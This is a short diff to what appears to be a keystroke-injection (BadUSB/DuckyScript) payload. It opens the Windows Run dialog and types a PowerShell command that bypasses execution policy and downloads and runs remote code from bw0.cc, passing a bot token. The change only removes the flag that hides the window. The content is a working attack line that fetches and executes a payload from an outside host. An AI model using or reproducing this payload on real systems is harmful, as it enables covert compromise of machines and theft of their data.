@@ -17,6 +17,6 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; iex (irm bw0.cc/dcc2)
+STRING powershell -Ep Bypass -C $tk = 'BOT_TOKEN'; iex (irm bw0.cc/dcc2)
 ENTER
 
